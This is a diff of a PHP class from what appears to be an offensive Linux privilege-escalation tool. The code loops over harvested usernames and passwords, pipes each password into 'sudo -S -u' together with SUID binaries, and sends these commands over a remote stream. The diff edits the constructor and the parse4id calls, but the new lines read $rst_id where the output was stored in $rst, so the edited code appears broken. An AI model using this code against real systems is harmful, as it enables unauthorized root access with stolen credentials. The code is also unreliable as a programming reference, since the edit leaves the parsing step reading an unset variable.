@@ -4,8 +4,8 @@
 class check4linux8suid extends check4linux8exploits{
     var $socat_path ;
     
-    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context) {
-        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context);
+    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64) {
+        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64);
     }
     
     /*
@@ -474,7 +474,7 @@ EOC;
             foreach ($users4passwd as $username => $userpass){
                 $data_check = "echo '$userpass' | sudo -S -u $username $suid ";
                 $rst = $this->lan2stream4result($data_check,$this->stream_timeout);
-                list($uid_found,$username_found,$gid_found,$groupname_found) = $this->parse4id($rst);
+               list($uid_found,$username_found,$gid_found,$groupname_found,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                 // var_dump($username_found);
                 //$this->pause();
                 
@@ -527,7 +527,7 @@ EOC;
                     if (!empty($user_shell)){
                         $data_check = "echo '$userpass' | sudo -S -u $user_shell $suid";
                         $rst = $this->lan2stream4result($data_check,$this->stream_timeout);
-                        list($uid_found,$username_found,$gid_found,$groupname_found) = $this->parse4id($rst);
+                        list($uid_found,$username_found,$gid_found,$groupname_found,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                         // var_dump($username_found);
                         //$this->pause();
                         
